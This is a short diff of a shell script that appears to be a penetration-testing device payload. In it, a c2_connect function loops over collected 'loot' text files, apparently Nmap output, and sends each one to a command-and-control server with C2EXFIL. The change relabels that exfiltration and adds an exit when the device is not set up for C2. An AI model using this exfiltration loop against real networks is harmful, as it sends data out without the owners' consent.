@@ -91,7 +91,11 @@ function c2_connect() {
 
 		# Exfiltrate all test loot files
 		FILES="$LOOT_DIR/*.txt"
-		for f in $FILES; do C2EXFIL STRING $f Example; done
+		for f in $FILES; do C2EXFIL STRING $f Nmap-C2-Example; done
+	else
+		# Exit script if not provisioned for C2
+		LED R SOLID
+		exit 1
 	fi
 }
 
